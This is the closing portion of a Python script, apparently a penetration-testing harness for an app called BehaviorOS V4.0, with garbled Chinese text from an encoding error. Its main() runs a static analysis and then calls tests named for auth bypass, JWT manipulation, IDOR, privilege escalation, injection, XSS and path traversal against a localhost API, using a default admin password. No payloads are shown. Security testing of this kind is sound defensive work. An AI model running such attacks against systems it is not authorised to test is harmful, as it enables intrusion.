    print(f"  è¯¦ç»†æŠ¥å‘Š: {output_path}")
    print("=" * 70)

    return report


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# ä¸»å…¥å£
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def main():
    parser = argparse.ArgumentParser(description="BehaviorOS V4.0 å®‰å…¨æ¸—é€æµ‹è¯•")
    parser.add_argument("--base", default="http://localhost:8000/api/v1", help="APIåŸºç¡€URL")
    parser.add_argument("--admin-user", default="admin", help="ç®¡ç†å‘˜ç”¨æˆ·å")
    parser.add_argument("--admin-pass", default="Admin@2026", help="ç®¡ç†å‘˜å¯†ç ")
    parser.add_argument("--output", default="pentest_report.json", help="æŠ¥å‘Šè¾“å‡ºè·¯å¾„")
    parser.add_argument("--skip-dynamic", action="store_true", help="ä»…æ‰§è¡Œé™æ€åˆ†æ")
    args = parser.parse_args()

    cfg = PenTestConfig(args.base, args.admin_user, args.admin_pass)

    # é™æ€åˆ†æ (å§‹ç»ˆæ‰§è¡Œ)
    static_analysis_findings()

    if not args.skip_dynamic:
        # è¿é€šæ€§æ£€æŸ¥
        try:
            r = cfg.session.get(cfg.base.replace("/api/v1", "/"), timeout=5)
            print(f"\n  è¿é€šæ€§: âœ“ (HTTP {r.status_code})")
        except Exception as e:
            print(f"\n  âš  æ— æ³•è¿æ¥åˆ° {cfg.base}: {e}")
            print("  å°†ä»…ç”Ÿæˆé™æ€åˆ†ææŠ¥å‘Š")
            generate_report(cfg, args.output)
            return

        # åŠ¨æ€æµ‹è¯•
        setup(cfg)
        test_t01_auth_bypass(cfg)
        test_t02_jwt_manipulation(cfg)
        test_t03_idor(cfg)
        test_t04_privilege_escalation(cfg)
        test_t05_injection(cfg)
        test_t06_xss(cfg)
        test_t07_rate_limiting(cfg)
        test_t08_info_disclosure(cfg)
        test_t09_cors(cfg)
        test_t10_business_logic(cfg)
        test_t11_mass_assignment(cfg)
        test_t12_path_traversal(cfg)
        test_t13_health_data_privacy(cfg)

    generate_report(cfg, args.output)


if __name__ == "__main__":
    main()
